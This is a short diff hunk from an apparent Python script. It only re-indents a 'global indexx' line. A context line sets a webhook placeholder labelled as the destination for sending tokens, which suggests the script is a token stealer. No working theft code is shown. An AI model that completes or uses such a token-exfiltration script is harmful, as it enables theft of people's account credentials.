@@ -24,7 +24,7 @@ webhook = "INSERT WEBHOOK TO SEND TOKENS TO HERE"
 
 def setup():
 	global tokens
-    global indexx
+    	global indexx
 	default_color = "Fore.CYAN"
 	default_styling = "Style.BRIGHT"
 	useinprint = str(default_color) + str(default_styling)
